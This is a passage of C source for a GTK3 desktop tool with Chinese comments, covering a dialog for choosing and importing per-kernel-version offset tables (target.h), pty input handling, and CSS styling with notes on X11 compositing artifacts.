                   ? "否（请手工 sudo rmmod krec_dump）" : "是");
    ansi_feed(a, msg, strlen(msg));
    log_flush(a);

    if (rel && *rel) {
        gtk_entry_set_text(GTK_ENTRY(a->entry_krec), rel);
        g_snprintf(msg, sizeof(msg), "偏移表已就绪: %s", rel);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), msg);
        gtk_widget_set_name(a->status_lbl, "status-ok");
    } else {
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表已导出");
        gtk_widget_set_name(a->status_lbl, "status-ok");
    }

done:
    g_free(ko);
    g_free(why);
    g_free(insmod_bin);
    g_free(rmmod_bin);
    g_free(out);
    g_free(err);
    g_free(th);
    g_free(rel);
    g_free(src);
    g_free(root);
    g_free(sub);
    g_free(path);
    g_free(recp);
}

typedef struct {
    App        *a;
    GtkWidget  *dlg;
    GtkWidget  *list;       /* GtkListBox */
    GtkWidget  *search;     /* 过滤输入框 */
    GPtrArray  *names;      /* 配置名 = target.h 上一级目录名 */
    GPtrArray  *rows;       /* 与 names 平行的行 widget */
    GPtrArray  *nos;        /* 与 names 平行的序号 label */
    char       *sel;        /* 当前选中的名字 */
} PickCtx;

static void pick_apply_filter(PickCtx *c);

/* offset/ 目录里找 target.h: 名字取它上一级目录名, 去重后收集 */
static void scan_target_hs(const char *base, int depth, GPtrArray *out)
{
    GDir *d = g_dir_open(base, 0, NULL);
    const char *e;

    if (!d)
        return;
    while ((e = g_dir_read_name(d)) != NULL) {
        char path[760];

        if (e[0] == '.')
            continue;
        g_snprintf(path, sizeof(path), "%s/%s", base, e);
        if (g_file_test(path, G_FILE_TEST_IS_DIR)) {
            if (depth < 3)
                scan_target_hs(path, depth + 1, out);
        } else if (!strcmp(e, "target.h")) {
            char *dir = g_path_get_dirname(path);
            char *name = g_path_get_basename(dir);
            guint i;
            gboolean dup = FALSE;

            for (i = 0; i < out->len; i++)
                if (!strcmp(g_ptr_array_index(out, i), name)) {
                    dup = TRUE;
                    break;
                }
            if (!dup)
                g_ptr_array_add(out, g_strdup(name));
            g_free(dir);
            g_free(name);
        }
    }
    g_dir_close(d);
}

static int pick_cmp(gconstpointer pa, gconstpointer pb)
{
    const char *a = *(const char *const *)pa;
    const char *b = *(const char *const *)pb;

    return strcmp(a, b);
}

/* 取程序目录下的 offset/; 找不到返回 FALSE */
static gboolean ovs_offset_dir(char *out, size_t n)
{
    char exe[512], exdir[512];
    ssize_t rl = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    char *slash;

    if (rl <= 0)
        return FALSE;
    exe[rl] = '\0';
    g_strlcpy(exdir, exe, sizeof(exdir));
    slash = strrchr(exdir, '/');
    if (!slash)
        return FALSE;
    *slash = '\0';
    g_snprintf(out, n, "%s/offset", exdir);
    return TRUE;
}

static void pick_reload(PickCtx *c)
{
    GList *children, *it;
    guint i;

    /* 清空旧行 */
    children = gtk_container_get_children(GTK_CONTAINER(c->list));
    for (it = children; it; it = it->next)
        gtk_widget_destroy(GTK_WIDGET(it->data));
    g_list_free(children);

    g_ptr_array_set_size(c->names, 0);
    g_ptr_array_set_size(c->rows, 0);
    g_ptr_array_set_size(c->nos, 0);
    g_free(c->sel);
    c->sel = NULL;

    {
        char offdir[600];

        if (ovs_offset_dir(offdir, sizeof(offdir)))
            scan_target_hs(offdir, 0, c->names);
    }
    g_ptr_array_sort(c->names, pick_cmp);

    for (i = 0; i < c->names->len; i++) {
        GtkWidget *row = gtk_list_box_row_new();
        GtkWidget *h = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 10);
        GtkWidget *no = gtk_label_new(NULL);
        GtkWidget *nm = gtk_label_new(g_ptr_array_index(c->names, i));
        char buf[16];

        g_snprintf(buf, sizeof(buf), "%u", i + 1);
        gtk_label_set_text(GTK_LABEL(no), buf);
        gtk_widget_set_size_request(no, 30, -1);
        gtk_widget_set_halign(no, GTK_ALIGN_END);
        gtk_widget_set_name(no, "pickno");

        gtk_widget_set_halign(nm, GTK_ALIGN_START);
        gtk_box_pack_start(GTK_BOX(h), no, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(h), nm, FALSE, FALSE, 0);
        gtk_widget_set_margin_start(h, 12);
        gtk_widget_set_margin_top(h, 3);
        gtk_widget_set_margin_bottom(h, 3);
        gtk_container_add(GTK_CONTAINER(row), h);
        gtk_container_add(GTK_CONTAINER(c->list), row);

        g_ptr_array_add(c->rows, row);
        g_ptr_array_add(c->nos, no);
    }
    /* 先让新行进入"已显示"状态, 再按关键字过滤隐藏 */
    gtk_widget_show_all(c->list);
    if (c->search)
        pick_apply_filter(c);
}

/*
 * 过滤: 关键字(不分大小写)匹配配置名, 只显示命中行;
 * 显示出来的行按 1..N 重新编号。清空关键字恢复全量。
 */
static void pick_apply_filter(PickCtx *c)
{
    const char *raw = gtk_entry_get_text(GTK_ENTRY(c->search));
    char *q = g_ascii_strdown(raw, -1);
    guint i;
    int seq = 0;
    gboolean sel_hit = FALSE;

    for (i = 0; i < c->names->len; i++) {
        const char *nm = g_ptr_array_index(c->names, i);
        char *ln = g_ascii_strdown(nm, -1);
        gboolean hit = (*q == '\0') || strstr(ln, q) != NULL;
        GtkWidget *row = g_ptr_array_index(c->rows, i);
        char buf[16];

        gtk_widget_set_visible(row, hit);
        if (hit) {
            g_snprintf(buf, sizeof(buf), "%d", ++seq);
            gtk_label_set_text(GTK_LABEL(g_ptr_array_index(c->nos, i)), buf);
            if (c->sel && !strcmp(nm, c->sel))
                sel_hit = TRUE;
        }
        g_free(ln);
    }
    g_free(q);

    /* 选中项被过滤掉了: 取消选中, 免得确认到看不见的项 */
    if (c->sel && !sel_hit) {
        g_free(c->sel);
        c->sel = NULL;
        gtk_list_box_unselect_all(GTK_LIST_BOX(c->list));
    }
}

static void on_pick_search_changed(GtkEditable *ed, gpointer data)
{
    (void)ed;
    pick_apply_filter(data);
}

/* 输入框右侧的小叉: 一键清空关键字 */
static void on_pick_search_clear(GtkEntry *e, GtkEntryIconPosition pos,
                                 GdkEventButton *ev, gpointer data)
{
    (void)ev;
    (void)data;
    if (pos == GTK_ENTRY_ICON_SECONDARY)
        gtk_entry_set_text(e, "");
}

static void pick_free(PickCtx *c)
{
    guint i;

    for (i = 0; i < c->names->len; i++)
        g_free(g_ptr_array_index(c->names, i));
    g_ptr_array_free(c->names, TRUE);
    g_ptr_array_free(c->rows, TRUE);   /* 行 widget 随窗口销毁, 只放数组 */
    g_ptr_array_free(c->nos, TRUE);
    g_free(c->sel);
}

/* 弹一个小输入框问配置名, 返回堆上的字符串 (调用者负责释放) 或 NULL */
static char *ask_name(GtkWidget *parent, const char *prefill)
{
    GtkWidget *dlg = gtk_dialog_new_with_buttons("配置名",
                      GTK_WINDOW(parent),
                      GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
                      "取消", GTK_RESPONSE_CANCEL,
                      "导入", GTK_RESPONSE_OK,
                      NULL);
    GtkWidget *box = gtk_dialog_get_content_area(GTK_DIALOG(dlg));
    GtkWidget *lbl = gtk_label_new("将把该表存为 offset/<配置名>/target.h (同名覆盖)。"
                                   "配置名：");
    GtkWidget *entry = gtk_entry_new();
    char *ret = NULL;

    gtk_container_set_border_width(GTK_CONTAINER(box), 12);
    gtk_box_pack_start(GTK_BOX(box), lbl, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(box), entry, FALSE, FALSE, 4);
    gtk_entry_set_text(GTK_ENTRY(entry), prefill);
    gtk_entry_set_activates_default(GTK_ENTRY(entry), TRUE);
    gtk_dialog_set_default_response(GTK_DIALOG(dlg), GTK_RESPONSE_OK);
    gtk_widget_show_all(dlg);

    if (gtk_dialog_run(GTK_DIALOG(dlg)) == GTK_RESPONSE_OK) {
        const char *s = gtk_entry_get_text(GTK_ENTRY(entry));

        while (*s == '/')
            s++;
        if (*s)
            ret = g_strdup(s);
    }
    gtk_widget_destroy(dlg);
    return ret;
}

static void pick_confirm(PickCtx *c)
{
    if (!c->sel) {
        /* 没选任何一项: 留在窗口里, 到主窗口给个提示 */
        gtk_label_set_text(GTK_LABEL(c->a->status_lbl),
                           "请先在列表里选一项 target.h");
        gtk_widget_set_name(c->a->status_lbl, "status-warn");
        log_append_plain(c->a, "[!] 未选择 target.h：请在列表中点选一项后再确认。\n");
        log_flush(c->a);
        return;
    }
    {
        gtk_entry_set_text(GTK_ENTRY(c->a->entry_krec), c->sel);
        gtk_label_set_text(GTK_LABEL(c->a->status_lbl), "已选择 offset 表");
        gtk_widget_set_name(c->a->status_lbl, "status-ok");
        log_append_plain(c->a, "[+] 已选择 offset 配置表: ");
        log_append_plain(c->a, c->sel);
        log_append_plain(c->a, "\n");
        log_flush(c->a);
    }
    if (c->dlg)
        gtk_widget_destroy(c->dlg);
}

static void on_pick_row_activated(GtkListBox *lb, GtkListBoxRow *row,
                                  gpointer data)
{
    PickCtx *c = data;
    int idx = gtk_list_box_row_get_index(row);

    (void)lb;
    if (idx < 0 || (guint)idx >= c->names->len)
        return;
    g_free(c->sel);
    c->sel = g_strdup(g_ptr_array_index(c->names, idx));
    pick_confirm(c);
}

static void on_pick_row_selected(GtkListBox *lb, GtkListBoxRow *row,
                                 gpointer data)
{
    PickCtx *c = data;
    int idx;

    (void)lb;
    g_free(c->sel);
    c->sel = NULL;
    if (!row)
        return;
    idx = gtk_list_box_row_get_index(row);
    if (idx >= 0 && (guint)idx < c->names->len)
        c->sel = g_strdup(g_ptr_array_index(c->names, idx));
}

static void on_pick_import(GtkWidget *w, gpointer data)
{
    PickCtx *c = data;
    GtkWidget *fc;
    char *fn = NULL;

    (void)w;
    fc = gtk_file_chooser_dialog_new("导入自定义 target.h",
                                     GTK_WINDOW(c->dlg),
                                     GTK_FILE_CHOOSER_ACTION_OPEN,
                                     "取消", GTK_RESPONSE_CANCEL,
                                     "打开", GTK_RESPONSE_OK,
                                     NULL);
    if (gtk_dialog_run(GTK_DIALOG(fc)) == GTK_RESPONSE_OK)
        fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(fc));
    gtk_widget_destroy(fc);

    if (fn) {
        char *content = NULL, *name;
        char defname[160];

        /* 预填: 源文件上一级目录名; 不像版本号就让用户改 */
        {
            char *dir = g_path_get_dirname(fn);

            g_strlcpy(defname, g_path_get_basename(dir), sizeof(defname));
            g_free(dir);
        }
        name = ask_name(c->dlg, defname);
        if (name) {
            char offdir[600], sub[640], path[760];
            const char *cur;

            if (ovs_offset_dir(offdir, sizeof(offdir)) &&
                g_file_get_contents(fn, &content, NULL, NULL)) {
                g_snprintf(sub, sizeof(sub), "%s/%s", offdir, name);
                g_snprintf(path, sizeof(path), "%s/target.h", sub);
                if (g_mkdir_with_parents(sub, 0755) == 0 &&
                    g_file_set_contents(path, content, -1, NULL)) {
                    char msg[900];

                    g_snprintf(msg, sizeof(msg),
                               "\033[32m[+] 已导入配置表 %s (%ld 字节)。\033[0m\n",
                               path, (long)strlen(content));
                    log_flush(c->a);
                    ansi_feed(c->a, msg, strlen(msg));
                    log_flush(c->a);
                } else {
                    log_append_plain(c->a, "[!] 写入 offset/ 失败。\n");
                    log_flush(c->a);
                }
                g_free(content);

                /* 导入后刷新列表并选中它 */
                pick_reload(c);
                cur = name;
                {
                    guint i;

                    for (i = 0; i < c->names->len; i++) {
                        if (!strcmp(g_ptr_array_index(c->names, i), cur)) {
                            GtkListBoxRow *r = gtk_list_box_get_row_at_index(
                                GTK_LIST_BOX(c->list), (int)i);

                            if (r)
                                gtk_list_box_select_row(
                                    GTK_LIST_BOX(c->list), r);
                            break;
                        }
                    }
                }
                g_free(c->sel);
                c->sel = g_strdup(cur);
            }
            g_free(name);
        }
        g_free(fn);
    }
}

/* 弹窗销毁时释放上下文 (ctx 是静态的, 关掉后再点按钮会重建) */
static void pick_dlg_destroy(GtkWidget *w, gpointer data)
{
    PickCtx *c = data;

    (void)w;
    pick_free(c);
    c->dlg = NULL;
    c->list = NULL;
}

static void on_pick_confirm_btn(GtkWidget *w, gpointer data)
{
    (void)w;
    pick_confirm(data);
}

/* Esc 关窗 */
static gboolean on_pick_key(GtkWidget *w, GdkEventKey *ev, gpointer data)
{
    PickCtx *c = data;

    (void)w;
    if (ev->keyval == GDK_KEY_Escape) {
        gtk_widget_destroy(c->dlg);
        return TRUE;
    }
    return FALSE;
}

/* 无边框窗口: 按住标题行拖动 */
static gboolean on_pick_drag(GtkWidget *w, GdkEventButton *ev, gpointer data)
{
    PickCtx *c = data;

    (void)w;
    if (ev->button != 1)
        return FALSE;
    gtk_window_begin_move_drag(GTK_WINDOW(c->dlg), (gint)ev->button,
                               (gint)ev->x_root, (gint)ev->y_root, ev->time);
    return TRUE;
}

/*
 * 「选择 offset」: 圆角卡片窗口, 遍历程序目录下的 offset/,
 * 名字用 target.h 上一级目录名; 确认后把名字填进内核版本框 (-krec)。
 * 窗口本身透明 + RGBA visual, 圆角由 #pickinner 卡片画出。
 */
static void act_pick_offset(GtkWidget *w, gpointer data)
{
    App *a = data;
    static PickCtx ctx;
    GtkWidget *lbl, *scroller, *btns, *inner;

    (void)w;
    if (ctx.dlg) {   /* 已经开着, 提到前台即可 */
        gtk_window_present(GTK_WINDOW(ctx.dlg));
        return;
    }

    ctx.a = a;
    ctx.names = g_ptr_array_new();
    ctx.rows = g_ptr_array_new();
    ctx.nos = g_ptr_array_new();
    ctx.sel = NULL;

    ctx.dlg = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(ctx.dlg), "请选择 target.h");
    gtk_window_set_transient_for(GTK_WINDOW(ctx.dlg), GTK_WINDOW(a->window));
    gtk_window_set_modal(GTK_WINDOW(ctx.dlg), TRUE);
    gtk_window_set_default_size(GTK_WINDOW(ctx.dlg), 390, 460);
    gtk_window_set_resizable(GTK_WINDOW(ctx.dlg), FALSE);
    /* 去掉系统边框: 圆角完全由 #pickinner 卡片呈现 */
    gtk_window_set_decorated(GTK_WINDOW(ctx.dlg), FALSE);
    g_signal_connect(ctx.dlg, "key-press-event", G_CALLBACK(on_pick_key), &ctx);
    g_signal_connect(ctx.dlg, "destroy", G_CALLBACK(pick_dlg_destroy), &ctx);

    {
        GdkScreen *scr = gtk_widget_get_screen(ctx.dlg);
        GdkVisual *vis = gdk_screen_get_rgba_visual(scr);

        if (vis)
            gtk_widget_set_visual(ctx.dlg, vis);
    }
    gtk_widget_set_app_paintable(ctx.dlg, TRUE);
    gtk_widget_set_name(ctx.dlg, "pickdlg");

    /* 圆角卡片本体 */
    inner = gtk_box_new(GTK_ORIENTATION_VERTICAL, 8);
    gtk_widget_set_name(inner, "pickinner");
    gtk_widget_set_margin_top(inner, 12);
    gtk_widget_set_margin_bottom(inner, 12);
    gtk_widget_set_margin_start(inner, 12);
    gtk_widget_set_margin_end(inner, 12);
    gtk_container_add(GTK_CONTAINER(ctx.dlg), inner);

    lbl = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(lbl), "<b>请选择 target.h</b>");
    gtk_widget_set_halign(lbl, GTK_ALIGN_CENTER);

    /* 标题行: 标题居中, 右上角圆形关闭; 整行可拖动窗口 */
    {
        GtkWidget *head = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
        GtkWidget *sp = gtk_label_new("");
        GtkWidget *x = gtk_button_new();

        gtk_widget_set_size_request(sp, 26, -1);
        gtk_box_pack_start(GTK_BOX(head), sp, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(head), lbl, TRUE, TRUE, 0);

        gtk_widget_set_name(x, "pickclose");
        gtk_button_set_relief(GTK_BUTTON(x), GTK_RELIEF_NONE);
        gtk_widget_set_valign(x, GTK_ALIGN_CENTER);
        gtk_widget_set_tooltip_text(x, "关闭 (Esc)");
        gtk_container_add(GTK_CONTAINER(x),
                          gtk_image_new_from_icon_name("window-close-symbolic",
                                                       GTK_ICON_SIZE_MENU));
        g_signal_connect_swapped(x, "clicked", G_CALLBACK(gtk_widget_destroy),
                                 ctx.dlg);
        gtk_box_pack_end(GTK_BOX(head), x, FALSE, FALSE, 0);

        gtk_widget_add_events(head, GDK_BUTTON_PRESS_MASK);
        g_signal_connect(head, "button-press-event",
                         G_CALLBACK(on_pick_drag), &ctx);
        gtk_box_pack_start(GTK_BOX(inner), head, FALSE, FALSE, 2);
    }

    /* 过滤框: 实时按关键字过滤并重新编号 */
    ctx.search = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(ctx.search),
                                   "过滤：输入版本号关键字，如 6.6");
    gtk_entry_set_icon_from_icon_name(GTK_ENTRY(ctx.search),
                                      GTK_ENTRY_ICON_PRIMARY,
                                      "edit-find-symbolic");
    gtk_entry_set_icon_from_icon_name(GTK_ENTRY(ctx.search),
                                      GTK_ENTRY_ICON_SECONDARY,
                                      "edit-clear-symbolic");
    gtk_widget_set_name(ctx.search, "picksearch");
    g_signal_connect(ctx.search, "changed",
                     G_CALLBACK(on_pick_search_changed), &ctx);
    g_signal_connect(ctx.search, "icon-press",
                     G_CALLBACK(on_pick_search_clear), &ctx);
    gtk_box_pack_start(GTK_BOX(inner), ctx.search, FALSE, FALSE, 0);

    scroller = gtk_scrolled_window_new(NULL, NULL);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroller),
                                   GTK_POLICY_NEVER, GTK_POLICY_AUTOMATIC);
    gtk_widget_set_vexpand(scroller, TRUE);
    ctx.list = gtk_list_box_new();
    gtk_list_box_set_selection_mode(GTK_LIST_BOX(ctx.list),
                                    GTK_SELECTION_SINGLE);
    gtk_list_box_set_activate_on_single_click(GTK_LIST_BOX(ctx.list), FALSE);
    g_signal_connect(ctx.list, "row-selected",
                     G_CALLBACK(on_pick_row_selected), &ctx);
    g_signal_connect(ctx.list, "row-activated",
                     G_CALLBACK(on_pick_row_activated), &ctx);
    gtk_container_add(GTK_CONTAINER(scroller), ctx.list);
    gtk_widget_set_name(scroller, "pickscroll");
    gtk_box_pack_start(GTK_BOX(inner), scroller, TRUE, TRUE, 0);

    /* 底部两个按钮: 导入自定义 / 确认 (双击条目 = 确认) */
    btns = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 10);
    gtk_widget_set_halign(btns, GTK_ALIGN_CENTER);

    gtk_box_pack_start(GTK_BOX(btns),
                       gtk_label_new(""), FALSE, FALSE, 0);
    {
        GtkWidget *b = gtk_button_new_with_label("导入自定义 target.h");

        g_signal_connect(b, "clicked", G_CALLBACK(on_pick_import), &ctx);
        gtk_box_pack_start(GTK_BOX(btns), b, FALSE, FALSE, 0);
    }
    {
        GtkWidget *b = gtk_button_new_with_label("确认");

        gtk_widget_set_name(b, "pickok");
        g_signal_connect(b, "clicked", G_CALLBACK(on_pick_confirm_btn), &ctx);
        gtk_box_pack_start(GTK_BOX(btns), b, FALSE, FALSE, 0);
    }
    gtk_box_pack_start(GTK_BOX(inner), btns, FALSE, FALSE, 2);

    pick_reload(&ctx);
    gtk_widget_show_all(ctx.dlg);

    /* 居中到主窗口 (无窗口管理器时也能摆正) */
    {
        GdkWindow *pw = gtk_widget_get_window(a->window);

        if (pw) {
            gint px = 0, py = 0;

            gdk_window_get_origin(pw, &px, &py);
            gtk_window_move(GTK_WINDOW(ctx.dlg),
                            px + (gdk_window_get_width(pw) - 390) / 2,
                            py + (gdk_window_get_height(pw) - 460) / 2);
        }
    }
}

static void on_toggle_expand(GtkWidget *w, gpointer data)
{
    App *a = data;
    gboolean on = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(w));

    if (a->revealer)
        gtk_revealer_set_reveal_child(GTK_REVEALER(a->revealer), on);
    if (a->lbl_expand)
        gtk_label_set_text(GTK_LABEL(a->lbl_expand), on ? "收起" : "展开");
    if (a->img_expand)
        gtk_image_set_from_icon_name(GTK_IMAGE(a->img_expand),
                                     on ? "go-down-symbolic"
                                        : "go-next-symbolic",
                                     GTK_ICON_SIZE_MENU);
}

static void act_stop(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    app_stop(a);
}

static void act_send(GtkWidget *w, gpointer data)
{
    App *a = data;
    const char *txt;

    (void)w;
    if (!a->running || a->master_fd < 0)
        return;

    txt = gtk_entry_get_text(GTK_ENTRY(a->entry_input));
    if (txt && *txt) {
        if (write(a->master_fd, txt, strlen(txt)) < 0) {
            /* pty 已关闭, 忽略 */
        }
    }
    if (write(a->master_fd, "\r", 1) < 0) {
        /* 同上 */
    }
    gtk_entry_set_text(GTK_ENTRY(a->entry_input), "");
}

static void act_ctrlc(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->running && a->master_fd >= 0) {
        if (write(a->master_fd, "\003", 1) < 0) {
            return;
        }
    }
}

static void on_entry_activate(GtkEntry *e, gpointer data)
{
    act_send(GTK_WIDGET(e), data);
}

/* 文件名浏览 */
static void on_file_set(GtkFileChooserButton *b, gpointer data)
{
    char *fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(b));

    if (fn) {
        gtk_entry_set_text(GTK_ENTRY(data), fn);
        g_free(fn);
    }
}

static GtkWidget *make_file_button(const char *title, GtkWidget *entry)
{
    GtkWidget *b = gtk_file_chooser_button_new(title, GTK_FILE_CHOOSER_ACTION_OPEN);

    gtk_file_chooser_set_current_folder(GTK_FILE_CHOOSER(b), g_get_home_dir());
    gtk_widget_set_size_request(b, 132, -1);
    g_signal_connect(b, "file-set", G_CALLBACK(on_file_set), entry);
    return b;
}

/* ---------------------------------------------------------------------------
 * 界面搭建
 * ------------------------------------------------------------------------ */
static void install_css(void)
{
    static const char *css =
        /*
         * 窗口自身必须有一层不透明底色。置成 transparent 时, 无合成器的
         * X11 (多数 XFCE 会话) 不会清窗口像素, 拖动/缩放时漏画的区域会
         * 直接露出桌面图标, 看起来就是"画面撕裂"。
         */
        "#mainwin { background-color: #eef4fb; }\n"
        "#mainwin, #mainwin label { color: #24323f; }\n"

        /* 标题栏 */
        "#mainwin headerbar {\n"
        "  background-image: none;\n"
        "  background-color: #f1f7fd;\n"
        "  border-bottom: 1px solid #d3e2f0;\n"
        "  box-shadow: none;\n"
        "  min-height: 38px;\n"
        "}\n"
        "#mainwin headerbar label { color: #1e2c3a; }\n"
        "#mainwin headerbar .subtitle { color: #5a7691; font-size: 9pt; }\n"
        "#mainwin headerbar button {\n"
        "  background-image: none;\n"
        "  background-color: transparent;\n"
        "  border: none;\n"
        "  box-shadow: none;\n"
        "}\n"
        "#mainwin headerbar button:hover { background-color: #dcebf8; }\n"

        /* 卡片 */
        "#mainwin frame.card {\n"
        "  background-color: rgba(251,253,255,0.50);\n"
        "  border: 1px solid #d5e5f4;\n"
        "  border-radius: 12px;\n"
        "}\n"
        "#mainwin frame.card > label {\n"
        "  background-color: #f9fcff;\n"
        "  color: #4a6b8a;\n"
        "  font-weight: bold;\n"
        "  padding: 0 4px;\n"
        "}\n"

        /*
         * 日志区: 浅色卡片。
         *
         * 这里绝对不能用 rgba/transparent: GtkScrolledWindow 与 GtkTextView
         * 在 X11 下各带自己的 GdkWindow, 没有合成器时 alpha 背景不会被清屏,
         * 露出的是 X root window 的旧像素 —— 表现就是日志区"透明"到能看见
         * 桌面壁纸, 而且拖动窗口时那块画面不跟着刷新 (像贴在屏幕上)。
         * 因此四层统一给不透明底色; 想要半透明效果只在有合成器时叠加,
         * 见 install_css() 末尾的 composited 分支。
         */
        "#mainwin #logcard {\n"
        "  background-color: #fbfdff;\n"
        "  border: 1px solid rgba(150,185,220,0.55);\n"
        "  border-radius: 12px;\n"
        "  padding: 0;\n"
        "}\n"
        "#mainwin #logcard scrolledwindow,\n"
        "#mainwin #logcard viewport,\n"
        "#mainwin #logcard textview,\n"
        "#mainwin #logcard textview text {\n"
        "  background-image: none;\n"
        "  background-color: #fbfdff;\n"
        "}\n"
        "#mainwin #logview {\n"
        "  color: #2b3644;\n"
        "}\n"
        "#mainwin #logview {\n"
        "  font-family: \"Noto Sans Mono CJK SC\", \"Source Han Mono SC\", \n"
        "               \"Sarasa Mono SC\", \"WenQuanYi Micro Hei Mono\", \n"
        "               \"WenQuanYi Zen Hei Mono\", \"Ubuntu Mono\", \n"
        "               \"DejaVu Sans Mono\", monospace;\n"
        "  font-size: 12px;\n"
        "  padding: 6px;\n"
        "}\n"

        /* 输入控件 */
        "#mainwin entry {\n"
        "  background-image: none;\n"
        "  background-color: rgba(255,255,255,0.56);\n"
        "  border: 1px solid rgba(163,192,217,0.62);\n"
        "  border-radius: 8px;\n"
        "  padding: 4px 8px;\n"
        "  color: #1f2b38;\n"
        "}\n"
        "#mainwin entry:focus { border-color: #74aede; }\n"
        "#mainwin button {\n"
        "  background-image: none;\n"
        "  background-color: #ffffff;\n"
        "  border: 1px solid #cfdfee;\n"
        "  border-radius: 8px;\n"
        "  padding: 3px 12px;\n"
        "  color: #21313f;\n"
        "}\n"
        "#mainwin button:hover { background-color: #eef7ff; border-color: #a9cbe8; }\n"
        "#mainwin button:active, #mainwin button:checked { background-color: #dcecfb; }\n"
        "#mainwin button:disabled {\n"
        "  color: #a8b6c4;\n"
        "  background-color: #f5f9fd;\n"
        "  border-color: #e2ecf5;\n"
        "}\n"
        "#mainwin button.suggested-action {\n"
        "  background-color: #79b6e6;\n"
        "  border-color: #5d9fd4;\n"
        "  color: #ffffff;\n"
        "  font-weight: bold;\n"
        "}\n"
        "#mainwin button.suggested-action:hover { background-color: #8ac4ee; }\n"
        "#mainwin button.destructive-action {\n"
        "  background-color: #ef9a9a;\n"
        "  border-color: #dd8484;\n"
        "  color: #ffffff;\n"
        "}\n"

        /* 左侧任务抽屉: 不画自身底色, 直接透出壁纸
         * (#sidescroll 是 GtkScrolledWindow, 自带 GdkWindow, 无合成器时
         *  不能透明, 否则拖动会露出 root 旧像素; 与日志区同一处理) */
        "#mainwin #sidebar {\n"
        "  background-color: transparent;\n"
        "  border-right: 1px solid rgba(150,180,210,0.45);\n"
        "}\n"
        "#mainwin #sidescroll, #mainwin #sidescroll viewport { background-color: #eef4fb; }\n"
        "#mainwin #tasklist { background-color: transparent; }\n"
        "#mainwin #tasklist row {\n"
        "  background-color: transparent;\n"
        "  border-radius: 10px;\n"
        "  padding: 7px 10px;\n"
        "  margin: 1px 0;\n"
        "  min-height: 26px;\n"
        "}\n"
        "#mainwin #tasklist row:hover { background-color: #f4f8fc; }\n"
        "#mainwin #tasklist row:selected { background-color: #eaf1f8; }\n"
        "#mainwin #tasklist row label { color: #2b3a49; font-size: 11pt; }\n"
        "#mainwin #tasklist row:selected label { color: #12314c; font-weight: bold; }\n"

        /* 状态与提示 */
        "#mainwin #status-ok   { color: #1c7a44; font-weight: bold; }\n"
        "#mainwin #status-warn { color: #9a6a00; font-weight: bold; }\n"
        "#mainwin #status-err  { color: #b3261e; font-weight: bold; }\n"
        "#mainwin #status-run  { color: #1f5fa8; font-weight: bold; }\n"
        "#mainwin #title-name  { color: #1b3a57; }\n"
        "#mainwin #hint { color: #5f7d99; font-size: 9pt; }\n"
        "#mainwin #roothint { color: #5f7d99; font-size: 8.5pt; }\n"
        "dialog #pickno { color: #8a97a5; }\n"
        "/* 「选择 offset」弹窗: 透明窗口 + 圆角卡片 + 过滤框 */\n"
        "#pickdlg { background-color: transparent; }\n"
        "#pickinner {\n"
        "  background-color: #f8fbff;\n"
        "  border: 1px solid #c9d9ea;\n"
        "  border-radius: 16px;\n"
        "}\n"
        "#picksearch {\n"
        "  background-color: #ffffff;\n"
        "  border: 1px solid #c5d5e4;\n"
        "  border-radius: 14px;\n"
        "  padding: 4px 10px;\n"
        "}\n"
        "#picksearch:focus { border-color: #7fb3e3; }\n"
        "#pickclose {\n"
        "  background-image: none;\n"
        "  background-color: transparent;\n"
        "  border: none;\n"
        "  box-shadow: none;\n"
        "  border-radius: 100px;\n"
        "  padding: 2px;\n"
        "  min-width: 22px;\n"
        "  min-height: 22px;\n"
        "  color: #6b8099;\n"
        "}\n"
        "#pickclose:hover { background-color: #e8eff7; }\n"
        "#pickok {\n"
        "  background-image: none;\n"
        "  background-color: #2f7fd0;\n"
        "  color: #ffffff;\n"
        "  border: 1px solid #2a72bc;\n"
        "  border-radius: 8px;\n"
        "  padding: 5px 18px;\n"
        "}\n"
        "#pickok:hover { background-color: #3a8ade; }\n"
        /* 列表容器必须给实色: 它带自己的 GdkWindow, 透明会露出 root 旧像素 */
        "#pickscroll, #pickscroll viewport { background-color: #f8fbff; }\n"
        "#pickscroll list, #pickscroll list row { background-color: transparent; }\n"
        "#mainwin #banner-warn {\n"
        "  background-color: #fdecea;\n"
        "  color: #9c1c16;\n"
        "  border: 1px solid #f0b7b1;\n"
        "  border-radius: 10px;\n"
        "  padding: 6px 10px;\n"
        "}\n"
        "tooltip, tooltip label { color: #f7fbff; }\n";
    GtkCssProvider *p = gtk_css_provider_new();

    gtk_css_provider_load_from_data(p, css, -1, NULL);
    gtk_style_context_add_provider_for_screen(
        gdk_screen_get_default(),
        GTK_STYLE_PROVIDER(p),
        GTK_STYLE_PROVIDER_PRIORITY_APPLICATION);
    g_object_unref(p);

    /*
     * 半透明只在有合成器时启用。
     *
     * 没有合成器 (纯 X11/XFCE 默认会话) 时, 带 alpha 的窗口背景不会被合成,
     * GtkTextView / GtkScrolledWindow 这类自带 GdkWindow 的控件就会显示
     * X root window 的陈旧像素: 日志区"透明"到能看见桌面壁纸, 拖动窗口
     * 时那块画面还不跟着动。所以默认给不透明底色, 检测到合成器才叠加
     * 一层半透明覆盖 (优先级高一档, 确保覆盖上面的实色)。
     */
    {
        GdkScreen *scr = gdk_screen_get_default();

        if (scr && gdk_screen_is_composited(scr)) {
            static const char *css_alpha =
                "#mainwin #logcard { background-color: rgba(255,255,255,0.72); }\n"
                "#mainwin #logcard scrolledwindow,\n"
                "#mainwin #logcard viewport,\n"
